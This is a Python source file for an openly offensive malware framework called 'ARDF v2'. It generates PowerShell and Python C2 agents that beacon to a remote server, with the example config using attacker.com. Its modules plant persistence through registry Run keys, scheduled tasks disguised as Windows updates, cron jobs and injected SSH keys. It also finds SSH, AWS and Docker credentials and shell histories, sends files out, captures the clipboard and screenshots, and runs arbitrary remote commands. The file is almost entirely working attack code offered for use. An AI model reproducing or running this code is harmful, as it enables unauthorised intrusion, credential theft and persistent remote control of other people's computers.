#!/usr/bin/env python3
"""
ARDF v2 Payload Delivery & Malware Module
Complete C2 agent, persistence, credential harvesting, data exfiltration
Based on EL-MAL Malware Architect playbook
"""

import asyncio
import socket
import json
try:
    import encrypt  # optional legacy dep; unused in this module
except ImportError:  # pragma: no cover
    encrypt = None
import subprocess
import platform
import os
import sys
from typing import Dict, List, Any, Callable
from dataclasses import dataclass
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


class PayloadType:
    """Payload types"""
    POWERSHELL = "powershell"
    PYTHON = "python"
    BASH = "bash"
    WINDOWS_EXE = "windows_exe"
    LINUX_ELF = "linux_elf"
    MACOS_MACHO = "macos_macho"


@dataclass
class PayloadConfig:
    """Payload configuration"""
    c2_server: str
    c2_port: int
    encryption_key: bytes
    payload_type: str
    persistence_type: str
    exfil_method: str
    modules_enabled: List[str]


class PayloadGenerator:
    """Generate executable payloads"""
    
    @staticmethod
    def generate_powershell_agent(c2_server: str, c2_port: int, key: str) -> str:
        """Generate PowerShell C2 agent"""
        
        script = f'''
# ARDF v2 PowerShell Agent
$c2Server = "{c2_server}"
$c2Port = {c2_port}
$encKey = "{key}"

function Send-C2 {{
    param($data)
    try {{
        $socket = New-Object System.Net.Sockets.TcpClient($c2Server, $c2Port)
        $stream = $socket.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.WriteLine([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data)))
        $writer.Flush()
        $socket.Close()
    }} catch {{}}
}}

function Get-SystemInfo {{
    return @{{
        Hostname = [System.Net.Dns]::GetHostName()
        Username = $env:USERNAME
        OS = [System.Environment]::OSVersion.VersionString
        Arch = [System.Environment]::Is64BitOperatingSystem
        ProcessID = $PID
        Privileges = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | Where-Object {{$_.Value -eq "S-1-5-32-544"}}).Value -eq "S-1-5-32-544"
    }} | ConvertTo-Json
}}

function Execute-Command {{
    param($command)
    try {{
        $output = Invoke-Expression $command 2>&1 | Out-String
        return $output
    }} catch {{
        return "Error: $_"
    }}
}}

function Install-Persistence {{
    param($method)
    if ($method -eq "registry") {{
        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $taskName = "WindowsUpdate"
        $taskPath = "$PSScriptRoot\\update.ps1"
        New-ItemProperty -Path $regPath -Name $taskName -Value "powershell.exe -ExecutionPolicy Bypass -File $taskPath" -Force
    }}
    elseif ($method -eq "task") {{
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $PSScriptRoot\\update.ps1"
        $trigger = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -RunLevel Highest -Force
    }}
}}

function Exfiltrate-Data {{
    param($data)
    Send-C2 -data $data
}}

# Main loop
while ($true) {{
    Start-Sleep -Seconds 10
    $systemInfo = Get-SystemInfo
    Send-C2 -data $systemInfo
}}
'''
        return script
    
    @staticmethod
    def generate_python_agent(c2_server: str, c2_port: int, key: str) -> str:
        """Generate Python C2 agent"""
        
        script = f'''#!/usr/bin/env python3
import socket
import subprocess
import json
import os
import platform
import time

C2_SERVER = "{c2_server}"
C2_PORT = {c2_port}
ENC_KEY = b"{key}"

class C2Agent:
    def __init__(self):
        self.running = True
        self.modules = {{
            'system': self.get_system_info,
            'command': self.execute_command,
            'file': self.handle_file_operation,
            'exfil': self.exfiltrate_data
        }}
    
    def get_system_info(self):
        return {{
            'hostname': platform.node(),
            'user': os.getenv('USER', os.getenv('USERNAME')),
            'os': platform.system(),
            'arch': platform.machine(),
            'pid': os.getpid(),
            'cwd': os.getcwd()
        }}
    
    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return result.decode('utf-8', errors='ignore')
        except:
            return "Command failed"
    
    def handle_file_operation(self, operation, path):
        if operation == 'read':
            with open(path, 'rb') as f:
                return f.read()
        elif operation == 'write':
            pass
    
    def exfiltrate_data(self, data):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_SERVER, C2_PORT))
            sock.sendall(data.encode() if isinstance(data, str) else data)
            sock.close()
        except:
            pass
    
    def heartbeat(self):
        while self.running:
            try:
                info = json.dumps(self.get_system_info())
                self.exfiltrate_data(info)
                time.sleep(10)
            except:
                time.sleep(30)

agent = C2Agent()
agent.heartbeat()
'''
        return script


class PersistenceModule:
    """Install persistence mechanisms"""
    
    @staticmethod
    async def install_windows_registry(payload_path: str) -> bool:
        """Install via Windows registry Run key"""
        try:
            import winreg
            
            reg_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(key)
            
            logger.info("[+] Registry persistence installed")
            return True
        except Exception as e:
            logger.error(f"[-] Registry persistence failed: {str(e)}")
            return False
    
    @staticmethod
    async def install_windows_scheduled_task(payload_path: str, task_name: str = "SystemUpdate") -> bool:
        """Install via Windows Scheduled Task"""
        try:
            cmd = f'''schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /rl highest /f'''
            
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            if result.returncode == 0:
                logger.info("[+] Scheduled task persistence installed")
                return True
            else:
                logger.error(f"[-] Scheduled task failed: {result.stderr.decode()}")
                return False
        except Exception as e:
            logger.error(f"[-] Scheduled task failed: {str(e)}")
            return False
    
    @staticmethod
    async def install_cron_job(payload_path: str, interval: str = "*/5 * * * *") -> bool:
        """Install via cron job on Linux"""
        try:
            cron_entry = f"{interval} {payload_path}"
            
            cmd = f'(crontab -l; echo "{cron_entry}") | crontab -'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            if result.returncode == 0:
                logger.info("[+] Cron persistence installed")
                return True
            else:
                logger.error(f"[-] Cron installation failed")
                return False
        except Exception as e:
            logger.error(f"[-] Cron installation failed: {str(e)}")
            return False
    
    @staticmethod
    async def install_ssh_key(ssh_key: str) -> bool:
        """Install SSH key for remote access"""
        try:
            home = os.path.expanduser("~")
            ssh_dir = f"{home}/.ssh"
            auth_keys = f"{ssh_dir}/authorized_keys"
            
            os.makedirs(ssh_dir, exist_ok=True)
            
            with open(auth_keys, 'a') as f:
                f.write(f"\n{ssh_key}")
            
            os.chmod(ssh_dir, 0o700)
            os.chmod(auth_keys, 0o600)
            
            logger.info("[+] SSH key persistence installed")
            return True
        except Exception as e:
            logger.error(f"[-] SSH key installation failed: {str(e)}")
            return False


class ReconnaissanceModule:
    """Gather system information"""
    
    @staticmethod
    async def enumerate_users() -> List[str]:
        """Enumerate system users"""
        users = []
        
        if platform.system() == "Windows":
            try:
                result = subprocess.check_output("wmic useraccount get name", shell=True)
                users = [u.strip() for u in result.decode().split('\n') if u.strip() and u != 'Name']
            except:
                pass
        else:
            try:
                result = subprocess.check_output("cut -d: -f1 /etc/passwd", shell=True)
                users = [u.strip() for u in result.decode().split('\n') if u.strip()]
            except:
                pass
        
        return users
    
    @staticmethod
    async def get_system_info() -> Dict:
        """Get system information"""
        return {
            'hostname': platform.node(),
            'os': platform.system(),
            'os_version': platform.release(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': platform.python_version(),
            'cwd': os.getcwd(),
            'pid': os.getpid(),
            'ppid': os.getppid() if hasattr(os, 'getppid') else None
        }
    
    @staticmethod
    async def find_credentials() -> Dict:
        """Find credentials in common locations"""
        credentials = {}
        
        patterns = {
            'ssh_keys': os.path.expanduser('~/.ssh/'),
            'aws_creds': os.path.expanduser('~/.aws/'),
            'docker_config': os.path.expanduser('~/.docker/'),
            'git_config': os.path.expanduser('~/.gitconfig'),
            'bash_history': os.path.expanduser('~/.bash_history'),
            'zsh_history': os.path.expanduser('~/.zsh_history')
        }
        
        for name, path in patterns.items():
            if os.path.exists(path):
                credentials[name] = path
        
        return credentials


class ExfiltrationModule:
    """Data exfiltration methods"""
    
    @staticmethod
    async def exfiltrate_files(c2_server: str, c2_port: int, file_paths: List[str]) -> bool:
        """Exfiltrate files to C2"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((c2_server, c2_port))
            
            for file_path in file_paths:
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()
                        sock.sendall(data)
                except:
                    pass
            
            sock.close()
            logger.info(f"[+] Exfiltrated {len(file_paths)} files")
            return True
        except Exception as e:
            logger.error(f"[-] Exfiltration failed: {str(e)}")
            return False
    
    @staticmethod
    async def exfiltrate_clipboard() -> str:
        """Exfiltrate clipboard contents"""
        try:
            if platform.system() == "Windows":
                import ctypes
                ctypes.windll.kernel32.GetClipboardData
                # Windows clipboard reading
            else:
                result = subprocess.check_output(['xclip', '-selection', 'clipboard', '-o'])
                return result.decode('utf-8', errors='ignore')
        except:
            return ""
    
    @staticmethod
    async def exfiltrate_screenshots() -> str:
        """Capture and exfiltrate screenshots"""
        try:
            if platform.system() == "Windows":
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                screenshot_path = "/tmp/screenshot.png"
                screenshot.save(screenshot_path)
                return screenshot_path
            else:
                # Linux screenshot
                subprocess.run(['import', '-window', 'root', '/tmp/screenshot.png'])
                return "/tmp/screenshot.png"
        except Exception as e:
            logger.error(f"[-] Screenshot failed: {str(e)}")
            return None


class C2Handler:
    """C2 command handler"""
    
    def __init__(self, c2_server: str, c2_port: int, encryption_key: bytes):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.encryption_key = encryption_key
        
        self.persistence = PersistenceModule()
        self.recon = ReconnaissanceModule()
        self.exfil = ExfiltrationModule()
    
    async def handle_command(self, command: Dict) -> Dict:
        """Handle incoming C2 command"""
        
        cmd_type = command.get('type')
        cmd_action = command.get('action')
        cmd_args = command.get('args', {})
        
        if cmd_type == 'persistence':
            if cmd_action == 'install_registry':
                return {'result': await self.persistence.install_windows_registry(cmd_args['path'])}
            elif cmd_action == 'install_task':
                return {'result': await self.persistence.install_windows_scheduled_task(cmd_args['path'])}
            elif cmd_action == 'install_cron':
                return {'result': await self.persistence.install_cron_job(cmd_args['path'])}
        
        elif cmd_type == 'recon':
            if cmd_action == 'system_info':
                return {'data': await self.recon.get_system_info()}
            elif cmd_action == 'users':
                return {'data': await self.recon.enumerate_users()}
            elif cmd_action == 'credentials':
                return {'data': await self.recon.find_credentials()}
        
        elif cmd_type == 'exfil':
            if cmd_action == 'files':
                return {'result': await self.exfil.exfiltrate_files(self.c2_server, self.c2_port, cmd_args['paths'])}
            elif cmd_action == 'clipboard':
                return {'data': await self.exfil.exfiltrate_clipboard()}
            elif cmd_action == 'screenshot':
                return {'data': await self.exfil.exfiltrate_screenshots()}
        
        elif cmd_type == 'execute':
            result = subprocess.run(cmd_action, shell=True, capture_output=True)
            return {'output': result.stdout.decode('utf-8', errors='ignore')}
        
        return {'error': 'Unknown command'}
    
    async def send_command_result(self, result: Dict) -> bool:
        """Send command result back to C2"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.c2_server, self.c2_port))
            
            data = json.dumps(result).encode()
            sock.sendall(data)
            sock.close()
            
            return True
        except Exception as e:
            logger.error(f"[-] Failed to send result: {str(e)}")
            return False


class PayloadExecutor:
    """Execute payload with all modules"""
    
    def __init__(self, config: PayloadConfig):
        self.config = config
        self.c2_handler = C2Handler(config.c2_server, config.c2_port, config.encryption_key)
    
    async def run(self):
        """Main payload loop"""
        logger.info("[+] Payload started")
        
        # Install persistence
        if self.config.persistence_type == 'registry':
            await self.c2_handler.persistence.install_windows_registry(sys.executable)
        elif self.config.persistence_type == 'cron':
            await self.c2_handler.persistence.install_cron_job(sys.executable)
        
        # Main heartbeat loop
        while True:
            try:
                # Get system info
                sys_info = await self.c2_handler.recon.get_system_info()
                
                # Send heartbeat
                await self.c2_handler.send_command_result({'type': 'heartbeat', 'data': sys_info})
                
                await asyncio.sleep(30)
            except:
                await asyncio.sleep(60)


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    
    # Example configuration
    config = PayloadConfig(
        c2_server='attacker.com',
        c2_port=8080,
        encryption_key=b'encryption_key_here',
        payload_type=PayloadType.PYTHON,
        persistence_type='registry',
        exfil_method='https',
        modules_enabled=['persistence', 'recon', 'exfil']
    )
    
    executor = PayloadExecutor(config)
    # asyncio.run(executor.run())
